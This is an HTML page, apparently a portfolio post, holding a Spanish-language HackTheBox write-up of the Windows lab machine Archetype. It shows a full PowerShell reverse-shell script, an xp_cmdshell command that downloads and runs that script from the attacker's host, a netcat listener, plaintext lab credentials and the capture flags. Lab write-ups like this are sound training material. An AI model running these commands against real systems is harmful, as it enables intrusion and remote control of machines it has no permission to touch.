@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Archetype — HTB Writeup | YRD</title>
+  <style>
+    :root {
+      --bg: #050a05;
+      --card-bg: #0a1a0a;
+      --border: #1a3d1a;
+      --primary: #39d353;
+      --cyan: #64ffda;
+      --text: #e2e8f0;
+      --text-dim: #94a3b8;
+      --text-muted: #8b949e;
+      --red: #ff6b6b;
+      --yellow: #ffd93d;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; min-height: 100vh; }
+    canvas#matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.13; pointer-events: none; z-index: 0; }
+
+    /* NAVBAR */
+    nav { position: sticky; top: 0; z-index: 100; background: rgba(5,10,5,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); padding: 0 2rem; height: 60px; display: flex; align-items: center; justify-content: space-between; }
+    .nav-logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
+    .nav-logo svg { width: 32px; height: 32px; }
+    .nav-logo span { font-size: 1.1rem; font-weight: 700; color: var(--primary); letter-spacing: 2px; }
+    .nav-links { display: flex; gap: 2rem; }
+    .nav-links a { color: var(--text-dim); text-decoration: none; font-size: 0.9rem; transition: color 0.2s; }
+    .nav-links a:hover { color: var(--primary); }
+
+    /* BACK BAR */
+    .back-bar { position: relative; z-index: 10; background: var(--card-bg); border-bottom: 1px solid var(--border); padding: 0.75rem 2rem; display: flex; align-items: center; gap: 1rem; }
+    .back-btn { color: var(--primary); text-decoration: none; font-size: 0.85rem; display: flex; align-items: center; gap: 6px; }
+    .back-btn:hover { color: var(--cyan); }
+    .breadcrumb { color: var(--text-muted); font-size: 0.85rem; }
+    .breadcrumb span { color: var(--text-dim); }
+
+    /* HERO */
+    .hero { position: relative; z-index: 10; padding: 3rem 2rem 2rem; max-width: 1200px; margin: 0 auto; }
+    .hero-breadcrumb { font-size: 0.8rem; color: var(--text-muted); margin-bottom: 1rem; }
+    .hero-breadcrumb a { color: var(--primary); text-decoration: none; }
+    .tags { display: flex; flex-wrap: wrap; gap: 0.5rem; margin-bottom: 1.5rem; }
+    .tag { padding: 4px 12px; border-radius: 20px; font-size: 0.75rem; font-weight: 600; letter-spacing: 1px; text-transform: uppercase; }
+    .tag-htb { background: rgba(57,211,83,0.15); color: var(--primary); border: 1px solid rgba(57,211,83,0.3); }
+    .tag-os { background: rgba(100,255,218,0.1); color: var(--cyan); border: 1px solid rgba(100,255,218,0.25); }
+    .tag-easy { background: rgba(57,211,83,0.1); color: #4ade80; border: 1px solid rgba(74,222,128,0.3); }
+    .tag-medium { background: rgba(255,217,61,0.1); color: var(--yellow); border: 1px solid rgba(255,217,61,0.3); }
+    .tag-hard { background: rgba(255,107,107,0.1); color: var(--red); border: 1px solid rgba(255,107,107,0.3); }
+    .hero h1 { font-size: 2.8rem; font-weight: 800; line-height: 1.2; margin-bottom: 1rem; }
+    .hero h1 span { color: var(--primary); }
+    .hero-desc { font-size: 1.05rem; color: var(--text-dim); line-height: 1.7; max-width: 700px; margin-bottom: 1.5rem; }
+    .meta-row { display: flex; flex-wrap: wrap; gap: 2rem; }
+    .meta-item { display: flex; flex-direction: column; gap: 4px; }
+    .meta-label { font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; }
+    .meta-value { font-size: 0.9rem; color: var(--text); font-weight: 600; }
+    .meta-value.green { color: var(--primary); }
+
+    /* MAIN LAYOUT */
+    .main { position: relative; z-index: 10; max-width: 1200px; margin: 0 auto; padding: 2rem; display: grid; grid-template-columns: 1fr 300px; gap: 2rem; }
+    @media (max-width: 900px) { .main { grid-template-columns: 1fr; } }
+
+    /* CONTENT */
+    .content { display: flex; flex-direction: column; gap: 2rem; }
+    .section { background: var(--card-bg); border: 1px solid var(--border); border-radius: 12px; padding: 1.75rem; }
+    .section-header { display: flex; align-items: center; gap: 10px; margin-bottom: 1.25rem; padding-bottom: 0.75rem; border-bottom: 1px solid var(--border); }
+    .section-icon { width: 8px; height: 8px; background: var(--primary); border-radius: 50%; box-shadow: 0 0 8px var(--primary); }
+    .section h2 { font-size: 1.1rem; font-weight: 700; color: var(--primary); text-transform: uppercase; letter-spacing: 2px; }
+    .section p { color: var(--text-dim); line-height: 1.8; margin-bottom: 0.75rem; }
+    .section p:last-child { margin-bottom: 0; }
+
+    /* CODE BLOCKS */
+    pre { background: #020c02; border: 1px solid var(--border); border-radius: 8px; padding: 1.25rem; overflow-x: auto; margin: 1rem 0; font-size: 0.82rem; line-height: 1.6; }
+    code { font-family: 'Cascadia Code', 'Fira Code', 'Courier New', monospace; }
+    .comment { color: #6a9955; }
+    .cmd { color: var(--cyan); }
+    .output { color: var(--text-dim); }
+    .highlight { color: var(--primary); font-weight: 600; }
+    .cred { color: var(--yellow); font-weight: 600; }
+    .flag-val { color: #ff79c6; }
+
+    /* FLAGS GRID */
+    .flags-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-top: 1rem; }
+    .flag-card { background: #020c02; border: 1px solid var(--border); border-radius: 10px; padding: 1.25rem; }
+    .flag-card .flag-label { font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 0.5rem; }
+    .flag-card .flag-hash { font-family: monospace; font-size: 0.8rem; color: var(--flag-val, #ff79c6); word-break: break-all; }
+
+    /* ATTACK CHAIN TIMELINE */
+    .timeline { display: flex; flex-direction: column; gap: 0; }
+    .timeline-item { display: flex; gap: 1.25rem; }
+    .timeline-left { display: flex; flex-direction: column; align-items: center; }
+    .timeline-dot { width: 12px; height: 12px; background: var(--primary); border-radius: 50%; box-shadow: 0 0 10px var(--primary); flex-shrink: 0; margin-top: 4px; }
+    .timeline-line { width: 2px; background: var(--border); flex: 1; min-height: 30px; }
+    .timeline-item:last-child .timeline-line { display: none; }
+    .timeline-content { padding-bottom: 1.5rem; }
+    .timeline-step { font-size: 0.7rem; color: var(--primary); text-transform: uppercase; letter-spacing: 1px; font-weight: 700; }
+    .timeline-title { font-size: 0.95rem; color: var(--text); font-weight: 600; margin: 2px 0; }
+    .timeline-desc { font-size: 0.82rem; color: var(--text-dim); line-height: 1.6; }
+
+    /* MITRE TAGS */
+    .mitre-grid { display: flex; flex-wrap: wrap; gap: 0.5rem; margin-top: 1rem; }
+    .mitre-tag { background: rgba(57,211,83,0.08); border: 1px solid rgba(57,211,83,0.2); color: var(--text-dim); padding: 5px 12px; border-radius: 6px; font-size: 0.78rem; font-family: monospace; }
+
+    /* SIDEBAR */
+    .sidebar { display: flex; flex-direction: column; gap: 1.5rem; }
+    .sidebar-card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 12px; padding: 1.5rem; }
+    .sidebar-card h3 { font-size: 0.8rem; text-transform: uppercase; letter-spacing: 2px; color: var(--primary); margin-bottom: 1.25rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+    .detail-row { display: flex; justify-content: space-between; align-items: center; padding: 0.5rem 0; border-bottom: 1px solid rgba(26,61,26,0.5); }
+    .detail-row:last-child { border-bottom: none; }
+    .detail-key { font-size: 0.8rem; color: var(--text-muted); }
+    .detail-val { font-size: 0.82rem; color: var(--text); font-weight: 600; text-align: right; }
+    .detail-val.green { color: var(--primary); }
+    .detail-val.cyan { color: var(--cyan); }
+
+    /* SKILL BARS */
+    .skill-item { margin-bottom: 1rem; }
+    .skill-item:last-child { margin-bottom: 0; }
+    .skill-header { display: flex; justify-content: space-between; margin-bottom: 5px; }
+    .skill-name { font-size: 0.82rem; color: var(--text-dim); }
+    .skill-pct { font-size: 0.8rem; color: var(--primary); font-weight: 600; }
+    .skill-bar { height: 4px; background: var(--border); border-radius: 2px; }
+    .skill-fill { height: 100%; background: linear-gradient(90deg, var(--primary), var(--cyan)); border-radius: 2px; }
+
+    /* TOOLS */
+    .tools-list { display: flex; flex-direction: column; gap: 0.6rem; }
+    .tool-item { display: flex; align-items: center; gap: 10px; padding: 0.6rem 0.75rem; background: #020c02; border: 1px solid var(--border); border-radius: 8px; }
+    .tool-dot { width: 6px; height: 6px; background: var(--primary); border-radius: 50%; }
+    .tool-name { font-size: 0.82rem; color: var(--text-dim); font-family: monospace; }
+
+    /* IP BADGE */
+    .ip-badge { display: inline-block; background: rgba(57,211,83,0.1); border: 1px solid rgba(57,211,83,0.3); color: var(--primary); padding: 3px 10px; border-radius: 6px; font-family: monospace; font-size: 0.8rem; }
+  </style>
+</head>
+<body>
+<canvas id="matrix"></canvas>
+
+<!-- NAVBAR -->
+<nav>
+  <a class="nav-logo" href="#">
+    <svg viewBox="0 0 32 32" fill="none">
+      <polygon points="16,2 30,10 30,22 16,30 2,22 2,10" fill="none" stroke="#39d353" stroke-width="2"/>
+      <text x="16" y="21" text-anchor="middle" fill="#39d353" font-size="11" font-weight="bold" font-family="monospace">YRD</text>
+    </svg>
+    <span>YRD</span>
+  </a>
+  <div class="nav-links">
+    <a href="#">Home</a>
+    <a href="#">About</a>
+    <a href="#">Skills</a>
+    <a href="#">Projects</a>
+  </div>
+</nav>
+
+<!-- BACK BAR -->
+<div class="back-bar">
+  <a class="back-btn" href="#">← Back</a>
+  <span class="breadcrumb">Machine — <span>Archetype (HTB)</span></span>
+</div>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-breadcrumb">
+    <a href="#">HTB Máquinas</a> / <a href="#">Windows</a> / Archetype
+  </div>
+  <div class="tags">
+    <span class="tag tag-htb">HACKTHEBOX</span>
+    <span class="tag tag-os">WINDOWS</span>
+    <span class="tag tag-easy">VERY EASY</span>
+    <span class="tag tag-htb">STARTING POINT</span>
+  </div>
+  <h1>Archetype <span>Machine</span></h1>
+  <p class="hero-desc">
+    Máquina Windows de nivel inicial que explora enumeración SMB anónima para obtener credenciales de configuración MSSQL, abuso de <code>xp_cmdshell</code> para ejecución remota de código, y escalada de privilegios mediante historial de PowerShell que expone contraseñas de administrador.
+  </p>
+  <div class="meta-row">
+    <div class="meta-item"><span class="meta-label">Autor</span><span class="meta-value green">Yoandy Ramirez Delgado</span></div>
+    <div class="meta-item"><span class="meta-label">Tipo</span><span class="meta-value">HTB Starting Point</span></div>
+    <div class="meta-item"><span class="meta-label">Herramienta Clave</span><span class="meta-value">impacket / mssqlclient</span></div>
+    <div class="meta-item"><span class="meta-label">Objetivo</span><span class="meta-value">NT AUTHORITY\SYSTEM</span></div>
+  </div>
+</div>
+
+<!-- MAIN LAYOUT -->
+<div class="main">
+  <div class="content">
+
+    <!-- ESCENARIO -->
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Escenario</h2></div>
+      <p>Archetype es una máquina Windows del Starting Point de HackTheBox con dirección IP <span class="ip-badge">10.129.96.188</span>. El objetivo simula un entorno corporativo donde un servidor MSSQL tiene habilitado el procedimiento almacenado <code>xp_cmdshell</code>, permitiendo ejecución de comandos del sistema.</p>
+      <p>El vector inicial consiste en acceder a un share SMB de manera anónima y recuperar un archivo de configuración que contiene credenciales en texto plano para el servicio SQL Server. Desde allí, la escalada aprovecha prácticas inseguras de historial de comandos en PowerShell.</p>
+    </div>
+
+    <!-- RECONOCIMIENTO -->
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Reconocimiento</h2></div>
+      <p><strong>Escaneo de puertos con Nmap:</strong></p>
+      <pre><code><span class="cmd">nmap -sC -sV -oA archetype 10.129.96.188</span>
+
+<span class="output">PORT     STATE SERVICE      VERSION
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Windows Server 2019 Standard
+1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000</span></code></pre>
+
+      <p><strong>Enumeración SMB anónima:</strong></p>
+      <pre><code><span class="cmd">smbclient -N -L //10.129.96.188</span>
+
+<span class="output">Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+backups         Disk
+C$              Disk      Default share
+IPC$            IPC       Remote IPC</span>
+
+<span class="cmd">smbclient -N //10.129.96.188/backups</span>
+<span class="output">smb: \> ls
+  prod.dtsConfig    AR    609   Mon Jan 20 08:23:02 2020</span>
+
+<span class="cmd">get prod.dtsConfig</span></code></pre>
+
+      <p><strong>Credenciales descubiertas en <code>prod.dtsConfig</code>:</strong></p>
+      <pre><code><span class="output">&lt;ConfigurationSetting&gt;
+  &lt;Name&gt;Password&lt;/Name&gt;
+  &lt;ConfiguredValue&gt;<span class="cred">M3g4c0rp123</span>&lt;/ConfiguredValue&gt;
+&lt;/ConfigurationSetting&gt;
+&lt;ConfigurationSetting&gt;
+  &lt;Name&gt;UserName&lt;/Name&gt;
+  &lt;ConfiguredValue&gt;<span class="cred">ARCHETYPE\sql_svc</span>&lt;/ConfiguredValue&gt;
+&lt;/ConfigurationSetting&gt;</span></code></pre>
+    </div>
+
+    <!-- EXPLOTACIÓN -->
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Explotación Inicial</h2></div>
+      <p><strong>Conexión a MSSQL con impacket:</strong></p>
+      <pre><code><span class="cmd">python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.96.188 -windows-auth</span>
+
+<span class="output">SQL> EXEC sp_configure 'show advanced options', 1;
+SQL> RECONFIGURE;
+SQL> EXEC sp_configure 'xp_cmdshell', 1;
+SQL> RECONFIGURE;
+SQL> xp_cmdshell "whoami"</span>
+<span class="highlight">archetype\sql_svc</span></code></pre>
+
+      <p><strong>Reverse shell con PowerShell:</strong></p>
+      <pre><code><span class="comment"># Crear shell.ps1 en nuestro servidor web</span>
+<span class="cmd">cat shell.ps1</span>
+<span class="output">$client = New-Object System.Net.Sockets.TCPClient("10.10.14.X",443);
+$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+  $sendback = (iex $data 2>&1 | Out-String );
+  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+  $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</span>
+
+<span class="comment"># Desde xp_cmdshell descargar y ejecutar</span>
+<span class="cmd">SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.X/shell.ps1')"</span>
+
+<span class="comment"># Listener en nuestra máquina</span>
+<span class="cmd">nc -lvnp 443</span>
+<span class="highlight">PS C:\Users\sql_svc\Downloads></span></code></pre>
+
+      <p><strong>User flag obtenida:</strong></p>
+      <pre><code><span class="cmd">type C:\Users\sql_svc\Desktop\user.txt</span>
+<span class="flag-val">3e7b102e78218e935bf3f4951fec21a3</span></code></pre>
+    </div>
+
+    <!-- ESCALADA -->
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Escalada de Privilegios</h2></div>
+      <p><strong>Ejecución de WinPEAS para enumeración:</strong></p>
+      <pre><code><span class="cmd">IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.X/winPEAS.ps1')</span></code></pre>
+
+      <p><strong>Historial de PowerShell con credenciales de Administrator:</strong></p>
+      <pre><code><span class="cmd">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span>
+
+<span class="output">net.exe use T: \\Archetype\backups /user:<span class="cred">administrator</span> <span class="cred">MEGACORP_4dm1n!!</span></span></code></pre>
+
+      <p><strong>Acceso como SYSTEM con psexec:</strong></p>
+      <pre><code><span class="cmd">python3 psexec.py administrator:MEGACORP_4dm1n\!\!@10.129.96.188</span>
+
+<span class="highlight">C:\Windows\system32> whoami</span>
+<span class="cred">nt authority\system</span>
+
+<span class="cmd">type C:\Users\Administrator\Desktop\root.txt</span>
+<span class="flag-val">b91ccec3305e98240082d4474b848528</span></code></pre>
+    </div>
+
+    <!-- FLAGS -->
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Flags</h2></div>
+      <div class="flags-grid">
+        <div class="flag-card">
+          <div class="flag-label">🏴 User Flag</div>
+          <div class="flag-hash">3e7b102e78218e935bf3f4951fec21a3</div>
+        </div>
+        <div class="flag-card">
+          <div class="flag-label">🏴 Root Flag</div>
+          <div class="flag-hash">b91ccec3305e98240082d4474b848528</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- CADENA DE ATAQUE -->
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Cadena de Ataque</h2></div>
+      <div class="timeline">
+        <div class="timeline-item">
+          <div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div>
+          <div class="timeline-content">
+            <div class="timeline-step">Paso 1</div>
+            <div class="timeline-title">Enumeración SMB Anónima</div>
+            <div class="timeline-desc">Listado de shares con acceso anónimo. Se descubre el share <code>backups</code> con el archivo <code>prod.dtsConfig</code>.</div>
+          </div>
+        </div>
+        <div class="timeline-item">
+          <div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div>
+          <div class="timeline-content">
+            <div class="timeline-step">Paso 2</div>
+            <div class="timeline-title">Credential Disclosure en DTS Config</div>
+            <div class="timeline-desc">El archivo de configuración SSIS expone credenciales MSSQL: <code>ARCHETYPE\sql_svc:M3g4c0rp123</code>.</div>
+          </div>
+        </div>
+        <div class="timeline-item">
+          <div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div>
+          <div class="timeline-content">
+            <div class="timeline-step">Paso 3</div>
+            <div class="timeline-title">Abuso de xp_cmdshell en MSSQL</div>
+            <div class="timeline-desc">Habilitación del procedimiento almacenado <code>xp_cmdshell</code> para ejecutar comandos del sistema operativo como <code>sql_svc</code>.</div>
+          </div>
+        </div>
+        <div class="timeline-item">
+          <div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div>
+          <div class="timeline-content">
+            <div class="timeline-step">Paso 4</div>
+            <div class="timeline-title">PowerShell Reverse Shell → User Flag</div>
+            <div class="timeline-desc">Descarga y ejecución de script PowerShell para obtener shell interactiva. Se obtiene la user flag del escritorio de sql_svc.</div>
+          </div>
+        </div>
+        <div class="timeline-item">
+          <div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div>
+          <div class="timeline-content">
+            <div class="timeline-step">Paso 5</div>
+            <div class="timeline-title">PSHistory → Credenciales de Administrator</div>
+            <div class="timeline-desc">WinPEAS revela el historial de comandos PowerShell con credenciales del Administrador: <code>MEGACORP_4dm1n!!</code>.</div>
+          </div>
+        </div>
+        <div class="timeline-item">
+          <div class="timeline-left"><div class="timeline-dot"></div><div class="timeline-line"></div></div>
+          <div class="timeline-content">
+            <div class="timeline-step">Paso 6</div>
+            <div class="timeline-title">psexec.py → NT AUTHORITY\SYSTEM</div>
+            <div class="timeline-desc">Uso de impacket psexec con las credenciales del administrador para obtener shell como SYSTEM y recuperar la root flag.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- MITRE ATT&CK -->
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>MITRE ATT&amp;CK</h2></div>
+      <div class="mitre-grid">
+        <span class="mitre-tag">T1083 — File Discovery</span>
+        <span class="mitre-tag">T1552.001 — Credentials in Files</span>
+        <span class="mitre-tag">T1505.001 — SQL Stored Procedures</span>
+        <span class="mitre-tag">T1059.001 — PowerShell</span>
+        <span class="mitre-tag">T1552.003 — Bash History</span>
+        <span class="mitre-tag">T1569.002 — Service Execution (psexec)</span>
+        <span class="mitre-tag">T1021.002 — SMB/Windows Admin Shares</span>
+      </div>
+    </div>
+
+  </div><!-- /content -->
+
+  <!-- SIDEBAR -->
+  <div class="sidebar">
+    <div class="sidebar-card">
+      <h3>Detalles del Reto</h3>
+      <div class="detail-row"><span class="detail-key">Dificultad</span><span class="detail-val green">Very Easy</span></div>
+      <div class="detail-row"><span class="detail-key">Sistema Operativo</span><span class="detail-val">Windows</span></div>
+      <div class="detail-row"><span class="detail-key">IP Target</span><span class="detail-val cyan">10.129.96.188</span></div>
+      <div class="detail-row"><span class="detail-key">Tipo</span><span class="detail-val">Starting Point</span></div>
+      <div class="detail-row"><span class="detail-key">Puntos entrada</span><span class="detail-val">SMB, MSSQL</span></div>
+      <div class="detail-row"><span class="detail-key">CVE</span><span class="detail-val">—</span></div>
+    </div>
+
+    <div class="sidebar-card">
+      <h3>Skills Demostradas</h3>
+      <div class="skill-item">
+        <div class="skill-header"><span class="skill-name">SMB Enumeration</span><span class="skill-pct">95%</span></div>
+        <div class="skill-bar"><div class="skill-fill" style="width:95%"></div></div>
+      </div>
+      <div class="skill-item">
+        <div class="skill-header"><span class="skill-name">MSSQL Exploitation</span><span class="skill-pct">90%</span></div>
+        <div class="skill-bar"><div class="skill-fill" style="width:90%"></div></div>
+      </div>
+      <div class="skill-item">
+        <div class="skill-header"><span class="skill-name">Windows Privilege Escalation</span><span class="skill-pct">85%</span></div>
+        <div class="skill-bar"><div class="skill-fill" style="width:85%"></div></div>
+      </div>
+      <div class="skill-item">
+        <div class="skill-header"><span class="skill-name">Impacket Suite</span><span class="skill-pct">88%</span></div>
+        <div class="skill-bar"><div class="skill-fill" style="width:88%"></div></div>
+      </div>
+    </div>
+
+    <div class="sidebar-card">
+      <h3>Herramientas</h3>
+      <div class="tools-list">
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">nmap</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">smbclient</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">mssqlclient.py</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">WinPEAS</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">psexec.py</span></div>
+        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">nc (netcat)</span></div>
+      </div>
+    </div>
+  </div><!-- /sidebar -->
+</div><!-- /main -->
+
+<script>
+  // Matrix Rain
+  const canvas = document.getElementById('matrix');
+  const ctx = canvas.getContext('2d');
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+  window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
+  const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノ0123456789ABCDEF<>{}[]';
+  const fontSize = 14;
+  let cols = Math.floor(canvas.width / fontSize);
+  let drops = Array(cols).fill(1);
+  function drawMatrix() {
+    ctx.fillStyle = 'rgba(5,10,5,0.05)';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#39d353';
+    ctx.font = fontSize + 'px monospace';
+    for (let i = 0; i < drops.length; i++) {
+      const char = chars[Math.floor(Math.random() * chars.length)];
+      ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+  }
+  setInterval(drawMatrix, 35);
+</script>
+</body>
+</html>
